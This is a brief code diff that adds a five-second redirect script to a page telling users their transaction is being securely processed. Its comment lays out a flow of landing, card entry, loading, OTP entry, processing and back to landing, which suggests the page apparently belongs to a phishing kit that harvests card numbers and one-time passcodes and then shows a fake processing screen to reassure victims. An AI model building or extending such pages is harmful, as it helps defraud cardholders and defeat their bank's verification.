@@ -73,5 +73,13 @@
         <p>Please wait while we securely process your transaction. Do not close or refresh this page.</p>
         <p class="muted">This may take a few moments.</p>
     </main>
+    <script>
+        // Spinning page that returns the user to the landing page after a short
+        // delay, so the flow is: landing → cc → loading → otp → processing → landing.
+        (function () {
+            var DELAY_MS = 5000;
+            setTimeout(function () { window.location.replace('/'); }, DELAY_MS);
+        })();
+    </script>
 </body>
 </html>
